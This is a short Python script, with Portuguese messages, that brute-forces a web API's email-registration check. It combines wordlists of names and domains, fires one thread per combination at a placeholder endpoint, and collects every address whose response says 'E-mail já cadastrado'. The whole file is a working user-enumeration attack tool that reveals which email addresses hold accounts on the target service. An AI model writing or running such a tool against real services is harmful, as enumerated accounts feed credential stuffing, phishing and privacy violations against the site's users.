#!/usr/bin/env python3
#
# MASS Brute for EMAIL Checking

from requests import get
from time import sleep
from threading import Thread

import threading

# threads_to_create = 100
threads = []
emails_leaked = []
qnt_emails_leaked = 0

print("[+] Iniciado MASS Brute Flooding... [+]")
sleep(3)
print("[+] Abrindo wordlist... [+]")
email_wlist = open('/home/israel-kali/wordlist/wordlist_email', 'r').readlines()
domain_wlist = open('/home/israel-kali/wordlist/domains', 'r').readlines()
sleep(3)

def mass_brute(email, domain, lock):
    emails_leaked = []
    qnt_emails_leaked = 0
    payloads = (f'{email}{domain}')
    payload = payloads.replace('\n','')
    urls = (f'http://url/v1/users/email?email={payload}')
    url = urls.replace('\n','')
    req = get(url)
    if 'E-mail já cadastrado' in req.text:
        emails_leaked.append(payload)
        print("[*] E-MAIL LEAKED [*]")
        print("[+] Printando lista com os emails descobertos.... [+]")
        print(emails_leaked)
    sleep(3)

lock = threading.Lock()    
for domain in domain_wlist:
    for email in email_wlist:
        #make_request(email, domain)
        th = Thread(target=mass_brute, args=(email, domain, lock))
        th.start()
        threads.append(th)

for th in threads:
    th.join()

print("[+] SCAN Finalizado com sucesso... [+]")
